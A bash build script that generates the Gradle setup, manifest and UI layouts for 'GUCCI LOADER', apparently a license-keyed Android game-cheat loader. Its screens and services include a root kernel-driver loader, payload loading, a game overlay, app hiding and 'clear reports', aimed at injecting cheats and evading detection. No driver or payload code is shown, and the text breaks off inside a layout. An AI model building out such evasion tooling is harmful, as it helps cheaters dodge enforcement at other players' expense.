#!/bin/bash

# ==========================================
# GUCCI LOADER - FULL COMPLETE BUILD SCRIPT
# ==========================================

wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip; unzip -q gradle-8.2-bin.zip; export PATH="$PWD/gradle-8.2/bin:$PATH"
rm -rf app *.gradle *.properties; mkdir -p app/src/main/java/com/example/shtile app/src/main/res/drawable app/src/main/res/layout app/src/main/res/values app/src/main/assets

# CRITICAL ASSETS
for file in Gucci_core Gucci_brutal Gucci_Ch Gucci_h Gucci_O Gucci_G Gucci_GO Gucci_CHS Gucci_B Gucci_M Gucci_L; do
    if [ -f "$file" ]; then cp "$file" app/src/main/assets/; fi
done
if [ -d "drivers" ]; then cp -r drivers app/src/main/assets/; fi

cat > settings.gradle << 'EOF'
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
rootProject.name = "GucciLoader"
include ':app'
EOF

cat > build.gradle << 'EOF'
plugins { id 'com.android.application' version '8.2.2' apply false; id 'org.jetbrains.kotlin.android' version '1.9.22' apply false }
EOF

cat > gradle.properties << 'EOF'
android.useAndroidX=true
android.nonTransitiveRClass=true
org.gradle.jvmargs=-Xmx2048m
EOF

cat > app/build.gradle << 'EOF'
plugins { id 'com.android.application'; id 'org.jetbrains.kotlin.android' }
android {
    namespace 'com.example.shtile'
    compileSdk 34
    defaultConfig { applicationId "com.example.shtile"; minSdk 24; targetSdk 34; versionCode 76; versionName "76.0" }
    compileOptions { sourceCompatibility JavaVersion.VERSION_17; targetCompatibility JavaVersion.VERSION_17 }
    kotlinOptions { jvmTarget = '17' }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.7.0'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
    implementation 'dev.rikka.shizuku:api:13.1.5'
    implementation 'dev.rikka.shizuku:provider:13.1.5'
}
EOF

cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
<uses-permission android:name="moe.shizuku.manager.permission.API_V23" />
<queries><intent><action android:name="android.intent.action.TTS_SERVICE" /></intent></queries>
<application android:allowBackup="true" android:label="GUCCI LOADER" android:icon="@drawable/ic_app_icon" android:theme="@style/AppTheme">
<activity android:name=".LoginActivity" android:exported="true" android:launchMode="singleTop"/>
<activity android:name=".MainActivity" android:exported="false"/>
<activity android:name=".HideAppsActivity" android:exported="false"/>
<activity android:name=".TerminalActivity" android:exported="false"/>
<activity android:name=".DriverLoaderActivity" android:exported="false"/>
<activity android:name=".ClearReportActivity" android:exported="false"/>
<activity android:name=".GucciVoiceActivity" android:exported="false"/>
<activity android:name=".TransparentActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:excludeFromRecents="true" android:taskAffinity="" android:noHistory="true"/>
<activity android:name=".TransparentVoiceActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:excludeFromRecents="true" android:taskAffinity="" android:noHistory="true"/>
<activity-alias android:name=".MainActivityAlias" android:targetActivity=".LoginActivity" android:exported="true" android:enabled="true" android:icon="@drawable/ic_app_icon"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity-alias>
<service android:name=".RunnerService" android:exported="false" android:foregroundServiceType="dataSync"/>
<service android:name=".RebootService" android:exported="false" android:foregroundServiceType="dataSync"/>
<service android:name=".TimerService" android:exported="false" android:foregroundServiceType="dataSync"/>
<service android:name=".FloaterOverlayService" android:exported="false" android:foregroundServiceType="specialUse"><property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Overlay for Game Mods" /></service>
<service android:name=".GucciVoiceService" android:exported="false" android:foregroundServiceType="mediaPlayback|microphone" />
<service android:name=".SafeTileService" android:exported="true" android:icon="@drawable/ic_tile_normal" android:label="Boost" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<service android:name=".BrutalTileService" android:exported="true" android:icon="@drawable/ic_tile_brutal" android:label="Turbo Mode" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<service android:name=".FocusTileService" android:exported="true" android:icon="@drawable/ic_tile_focus" android:label="Focus Mode" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<service android:name=".PayTileService" android:exported="true" android:icon="@drawable/ic_tile_pay" android:label="Payment Protection" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<service android:name=".FloaterTileService" android:exported="true" android:icon="@drawable/ic_tile_floater" android:label="Floater" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<service android:name=".GucciVoicesTileService" android:exported="true" android:icon="@drawable/ic_voice" android:label="Gucci Voices" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
<receiver android:name=".PackageReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.PACKAGE_ADDED"/><action android:name="android.intent.action.PACKAGE_REPLACED"/><data android:scheme="package"/></intent-filter></receiver>
<provider android:name="rikka.shizuku.ShizukuProvider" android:authorities="${applicationId}.shizuku" android:enabled="true" android:exported="true" android:multiprocess="false" android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" />
</application>
</manifest>
EOF

# ==========================================
# XML RESOURCES
# ==========================================

cat > app/src/main/res/values/styles.xml << 'EOF'
<resources><style name="AppTheme" parent="Theme.Material3.Dark.NoActionBar"></style></resources>
EOF

cat > app/src/main/res/values/colors.xml << 'EOF'
<resources>
<color name="bg_main">#07090C</color><color name="accent_green">#00E5A0</color><color name="accent_red">#FF4D4D</color><color name="text_primary">#FFFFFF</color><color name="text_secondary">#8B949E</color><color name="card_bg">#12161F</color><color name="card_stroke">#1F2633</color><color name="switch_track">#33FFFFFF</color>
</resources>
EOF

cat > app/src/main/res/values/strings.xml << 'EOF'
<resources><string name="app_name">GUCCI LOADER</string></resources>
EOF

cat > app/src/main/res/drawable/ic_app_icon.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="48dp" android:height="48dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#00E5A0" android:pathData="M12,2l3,6h6l-5,4 2,7 -6,-4 -6,4 2,-7 -5,-4h6z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_voice.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M12,14c1.66,0 3,-1.34 3,-3V5c0,-1.66 -1.34,-3 -3,-3S9,3.34 9,5v6c0,1.66 1.34,3 3,3zM17,11c0,2.76 -2.24,5 -5,5s-5,-2.24 -5,-5H5c0,3.53 2.61,6.43 6,6.92V21h2v-3.08c3.39,-0.49 6,-3.39 6,-6.92h-2z"/></vector>
EOF

cat > app/src/main/res/drawable/bg_box_dark.xml << 'EOF'
<shape xmlns:android="http://schemas.android.com/apk/res/android"><solid android:color="#151B23"/><corners android:radius="12dp"/><stroke android:width="1dp" android:color="#232A35"/></shape>
EOF

cat > app/src/main/res/drawable/bg_circle_grey.xml << 'EOF'
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="oval"><solid android:color="#1F2633"/></shape>
EOF

cat > app/src/main/res/drawable/ic_minimize.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M5,11h14v2H5z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_close.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M18.3,5.71L12.41,11.6 6.53,5.71 5.12,7.12 11,13 5.12,18.88 6.53,20.29 12.41,14.41 18.3,20.29 19.71,18.88 13.83,13 19.71,7.12z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_tile_floater.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2zM12,20c-4.41,0 -8,-3.59 -8,-8s3.59,-8 8,-8 8,3.59 8,8 -3.59,8 -8,8zM11,7h2v5.41l3.29,3.29 -1.41,1.41 -3.88,-3.88V7z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_terminal.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M20,4H4C2.89,4 2.01,4.89 2.01,6L2,18c0,1.11 0.89,2 2,2h16c1.11,0 2,-0.89 2,-2V6C22,4.89 21.11,4 20,4zM20,18H4v-6h16V18zM20,8H4V6h16V8zM6.5,13.5l2.5,2.5l-2.5,2.5L5,17l1.5,-1.5L5,14L6.5,13.5zM11,18h6v-1.5h-6V18z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_tile_normal.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:fillType="evenOdd" android:pathData="M12,1.5 C14.5,4.5 16,6.5 16,7 L8,7 C8,6.5 9.5,4.5 12,1.5 Z M7.5,8 L16.5,8 L16.5,15.5 L7.5,15.5 Z M12,9 A1.8,1.8 0 1,0 12,12.6 A1.8,1.8 0 1,0 12,9 Z M7.5,12 C4.5,13 3,15.5 3,19.5 L3,21 L7.5,16.5 Z M16.5,12 C19.5,13 21,15.5 21,19.5 L21,21 L16.5,16.5 Z M8,16 L16,16 L16,18 L8,18 Z M9.5,18.5 C9.5,18.5 10.5,21 12,23.5 C13.5,21 14.5,18.5 14.5,18.5 L13,20.5 L12,19 L11,20.5 Z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_tile_brutal.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M7,2v11h3v9l7,-12h-4l4,-8z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_tile_focus.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M12,7c2.76,0 5,2.24 5,5 0,0.65 -0.13,1.26 -0.36,1.83l2.92,2.92c1.51,-1.26 2.7,-2.89 3.43,-4.75 -1.73,-4.39 -6,-7.5 -11,-7.5 -1.4,0 -2.74,0.25 -3.98,0.7l2.16,2.16C10.74,7.13 11.35,7 12,7zM2,4.27l2.28,2.28 0.46,0.46C3.08,8.3 1.78,10.02 1,12c1.73,4.39 6,7.5 11,7.5 1.55,0 3.03,-0.3 4.38,-0.84l0.42,0.42L19.73,22 21,20.73 3.27,3 2,4.27z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_hide.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M12,7c2.76,0 5,2.24 5,5 0,0.65 -0.13,1.26 -0.36,1.83l2.92,2.92c1.51,-1.26 2.7,-2.89 3.43,-4.75 -1.73,-4.39 -6,-7.5 -11,-7.5 -1.4,0 -2.74,0.25 -3.98,0.7l2.16,2.16C10.74,7.13 11.35,7 12,7zM2,4.27l2.28,2.28 0.46,0.46C3.08,8.3 1.78,10.02 1,12c1.73,4.39 6,7.5 11,7.5 1.55,0 3.03,-0.3 4.38,-0.84l0.42,0.42L19.73,22 21,20.73 3.27,3 2,4.27z"/></vector>
EOF

cat > app/src/main/res/drawable/ic_tile_pay.xml << 'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#FFFFFFFF" android:pathData="M12,1L3,5v6c0,5.55 3.84,10.74 9,12 5.16,-1.26 9,-6.45 9,-12V5l-9,-4zm-2,16l-4,-4 1.41,-1.41L10,14.17l6.59,-6.59L18,9l-8,8z"/></vector>
EOF

# LAYOUTS
cat > app/src/main/res/layout/dialog_root.xml << 'EOF'
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="24dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="32dp" android:gravity="center">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="ROOT / ADB REQUIRED" android:textColor="@color/text_primary" android:textSize="22sp" android:textStyle="bold" android:layout_marginBottom="12dp"/>
<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="GUCCI LOADER requires Root Permission or Shizuku (ADB) to function properly." android:textColor="@color/text_secondary" android:textSize="15sp" android:gravity="center" android:layout_marginBottom="32dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnGrant" android:layout_width="match_parent" android:layout_height="56dp" android:text="GRANT ROOT" android:textColor="#000000" app:backgroundTint="@color/accent_green" app:cornerRadius="16dp" android:layout_marginBottom="12dp" android:textStyle="bold"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnShizuku" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="56dp" android:text="USE SHIZUKU (ADB)" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textColor="@color/accent_green" android:textStyle="bold" android:layout_marginBottom="12dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnExit" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="56dp" android:text="EXIT" app:strokeColor="@color/accent_red" app:cornerRadius="16dp" android:textColor="@color/accent_red" android:textStyle="bold"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
EOF

cat > app/src/main/res/layout/activity_login.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:background="#0a0e14">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="32dp" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintTop_toTopOf="parent">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="GUCCI LOADER" android:textColor="#2dd4a7" android:textSize="28sp" android:textStyle="bold" android:layout_gravity="center" android:layout_marginBottom="24dp"/>
<EditText android:id="@+id/keyInput" android:layout_width="match_parent" android:layout_height="50dp" android:hint="Enter License Key" android:textColor="#ffffff" android:textColorHint="#8b949e" android:background="#11161f" android:padding="10dp" android:layout_marginBottom="16dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/loginBtn" android:layout_width="match_parent" android:layout_height="55dp" android:text="LOGIN" android:textColor="#000000" app:backgroundTint="#2dd4a7" app:cornerRadius="12dp" android:textStyle="bold" android:layout_marginBottom="16dp"/>
<TextView android:id="@+id/deviceIdText" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Device ID: Loading..." android:textColor="#8b949e" android:textSize="12sp" android:layout_gravity="center"/>
</LinearLayout>
</androidx.constraintlayout.widget.ConstraintLayout>
EOF

cat > app/src/main/res/layout/list_item_app.xml << 'EOF'
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="8dp" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:padding="12dp" android:gravity="center_vertical">
<ImageView android:id="@+id/appIcon" android:layout_width="44dp" android:layout_height="44dp"/>
<LinearLayout android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:orientation="vertical" android:paddingStart="12dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
<View android:id="@+id/safetyDot" android:layout_width="10dp" android:layout_height="10dp" android:background="@drawable/bg_circle_grey" android:layout_marginEnd="6dp"/>
<TextView android:id="@+id/appName" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textColor="@color/text_primary" android:textSize="15sp" android:textStyle="bold"/>
</LinearLayout>
<TextView android:id="@+id/appPkg" android:layout_width="wrap_content" android:layout_height="wrap_content" android:textColor="@color/text_secondary" android:textSize="11sp"/>
</LinearLayout>
<com.google.android.material.checkbox.MaterialCheckBox android:id="@+id/appCheck" android:layout_width="wrap_content" android:layout_height="wrap_content" app:buttonTint="@color/accent_green" android:layout_marginEnd="8dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnOptions" style="@style/Widget.MaterialComponents.Button.TextButton" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="⚙️" android:textSize="20sp" android:minWidth="0dp" android:padding="8dp"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
EOF

cat > app/src/main/res/layout/activity_main.xml << 'EOF'
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:background="@color/bg_main" android:fillViewport="true">
<LinearLayout android:orientation="vertical" android:padding="24dp" android:layout_width="match_parent" android:layout_height="wrap_content">
<TextView android:id="@+id/titleText" android:text="GUCCI LOADER" android:textColor="@color/text_primary" android:textSize="36sp" android:fontFamily="sans-serif-black" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
<TextView android:id="@+id/subtitleText" android:text="Premium Panel By GUCCI" android:textColor="@color/accent_green" android:textSize="14sp" android:fontFamily="sans-serif-medium" android:layout_marginTop="-4dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
<TextView android:id="@+id/licenseTimerText" android:text="Expires in: Loading..." android:textColor="@color/accent_red" android:textSize="14sp" android:textStyle="bold" android:layout_marginTop="4dp" android:layout_marginBottom="24dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="20dp" android:layout_marginBottom="16dp">
<LinearLayout android:orientation="vertical" android:padding="20dp" android:layout_width="match_parent" android:layout_height="wrap_content">
<TextView android:text="LICENSE KEY" android:textColor="@color/accent_green" android:textSize="12sp" android:fontFamily="sans-serif-medium" android:layout_marginBottom="8dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
<EditText android:id="@+id/keyInput" android:hint="Enter license..." android:inputType="text" android:padding="12dp" android:background="#00000000" android:textColor="@color/text_primary" android:textColorHint="@color/text_secondary" android:layout_width="match_parent" android:layout_height="wrap_content"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="20dp" android:layout_marginBottom="24dp">
<LinearLayout android:orientation="vertical" android:padding="20dp" android:layout_width="match_parent" android:layout_height="wrap_content">
<TextView android:text="SELECT DRIVER (1-10)" android:textColor="@color/accent_green" android:textSize="12sp" android:fontFamily="sans-serif-medium" android:layout_marginBottom="8dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
<EditText android:id="@+id/brutalInput" android:hint="e.g. 7" android:inputType="number" android:padding="12dp" android:background="#00000000" android:textColor="@color/text_primary" android:textColorHint="@color/text_secondary" android:layout_width="match_parent" android:layout_height="wrap_content"/>
<TextView android:id="@+id/driverNameText" android:textColor="@color/accent_green" android:textSize="14sp" android:textStyle="bold" android:layout_marginTop="4dp" android:paddingStart="12dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.button.MaterialButton android:id="@+id/saveKeyBtn" android:layout_width="match_parent" android:layout_height="60dp" android:text="SAVE CONFIGURATION" android:textColor="#000000" app:backgroundTint="@color/accent_green" app:cornerRadius="16dp" android:layout_marginBottom="16dp" android:textStyle="bold" android:fontFamily="sans-serif-medium"/>
<com.google.android.material.button.MaterialButton android:id="@+id/loadFilesBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="wrap_content" android:layout_height="50dp" android:layout_marginTop="8dp" android:layout_gravity="center_horizontal" android:paddingStart="48dp" android:paddingEnd="48dp" android:text="LOAD INX" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="25dp" android:layout_marginBottom="16dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/launchFloaterBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:text="🚀 LAUNCH FLOATER" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
<com.google.android.material.button.MaterialButton android:id="@+id/loadDriverBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="16dp" android:text="⚡ KERNEL DRIVER LOADER" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
<com.google.android.material.button.MaterialButton android:id="@+id/clearReportBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="16dp" android:text="🧹 CLEAR REPORTS" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
<TextView android:paddingTop="40dp" android:gravity="center" android:text="Use Quick Setting tiles to load INX-Payload" android:textColor="@color/text_secondary" android:textSize="12sp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
<TextView android:id="@+id/contactAdminText" android:paddingTop="16dp" android:gravity="center" android:text="Contact Admin for Help" android:textColor="@color/accent_green" android:textSize="14sp" android:textStyle="bold" android:layout_width="match_parent" android:layout_height="wrap_content"/>
<LinearLayout android:orientation="horizontal" android:layout_width="match_parent" android:layout_height="wrap_content" android:paddingTop="32dp" android:paddingBottom="24dp" android:gravity="center">
<ImageButton android:id="@+id/hideAppsIcon" android:layout_width="60dp" android:layout_height="60dp" android:padding="16dp" android:background="?attr/selectableItemBackgroundBorderless" android:src="@drawable/ic_hide" app:tint="@color/accent_green" android:layout_marginEnd="16dp"/>
<ImageButton android:id="@+id/terminalIcon" android:layout_width="60dp" android:layout_height="60dp" android:padding="16dp" android:background="?attr/selectableItemBackgroundBorderless" android:src="@drawable/ic_terminal" app:tint="@color/accent_green" android:layout_marginEnd="16dp"/>
<ImageButton android:id="@+id/voiceIcon" android:layout_width="60dp" android:layout_height="60dp" android:padding="16dp" android:background="?attr/selectableItemBackgroundBorderless" android:src="@drawable/ic_voice" app:tint="@color/accent_green"/>
</LinearLayout>
</LinearLayout>
</ScrollView>
EOF

cat > app/src/main/res/layout/activity_driver_loader.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="@color/bg_main" android:padding="16dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="DRIVER LOADER" android:textColor="@color/text_primary" android:textSize="24sp" android:textStyle="bold" android:layout_marginBottom="16dp"/>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="16dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="SELECT DRIVER TYPE (BEST: PARADISE)" android:textColor="@color/accent_green" android:textStyle="bold" android:textSize="12sp" android:layout_marginBottom="8dp"/>
<Spinner android:id="@+id/spinnerDriver" android:layout_width="match_parent" android:layout_height="40dp" android:backgroundTint="@color/accent_green"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="16dp">
<TextView android:id="@+id/tvKernel" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Kernel: Detecting..." android:textColor="@color/accent_green" android:textStyle="bold" android:textSize="16sp"/>
<TextView android:id="@+id/tvArch" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Arch: Detecting..." android:textColor="@color/text_secondary" android:textSize="14sp" android:layout_marginTop="4dp"/>
<TextView android:id="@+id/tvHwid" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="HWID: Loading..." android:textColor="@color/accent_green" android:textSize="14sp" android:layout_marginTop="4dp"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.button.MaterialButton android:id="@+id/btnLoadDriver" android:layout_width="match_parent" android:layout_height="56dp" android:text="⚡ LOAD SELECTED DRIVER" android:textColor="#000000" app:backgroundTint="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold" android:layout_marginBottom="16dp"/>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp">
<ScrollView android:layout_width="match_parent" android:layout_height="match_parent" android:padding="12dp" android:background="@drawable/bg_box_dark">
<TextView android:id="@+id/tvLogs" android:layout_width="match_parent" android:layout_height="wrap_content" android:textColor="#00FF00" android:fontFamily="monospace" android:textSize="12sp" android:text="System ready. Waiting to load driver...\n\n"/>
</ScrollView>
</com.google.android.material.card.MaterialCardView>
</LinearLayout>
EOF

cat > app/src/main/res/layout/dialog_select_driver.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:background="@color/card_bg" android:padding="20dp">
<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Select Driver Variant" android:textColor="@color/accent_green" android:textSize="20sp" android:textStyle="bold" android:layout_marginBottom="8dp" />
<TextView android:id="@+id/tvDialogMessage" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Multiple drivers found. Please choose one:" android:textColor="@color/text_primary" android:textSize="14sp" android:layout_marginBottom="16dp" />
<ScrollView android:layout_width="match_parent" android:layout_height="wrap_content" android:maxHeight="300dp">
<LinearLayout android:id="@+id/driverListContainer" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" />
</ScrollView>
<com.google.android.material.button.MaterialButton android:id="@+id/btnCancelDialog" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="50dp" android:layout_marginTop="16dp" android:text="CANCEL" app:strokeColor="@color/accent_red" android:textColor="@color/accent_red" />
</LinearLayout>
EOF

cat > app/src/main/res/layout/activity_terminal.xml << 'EOF'
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="@color/bg_main" android:padding="16dp">
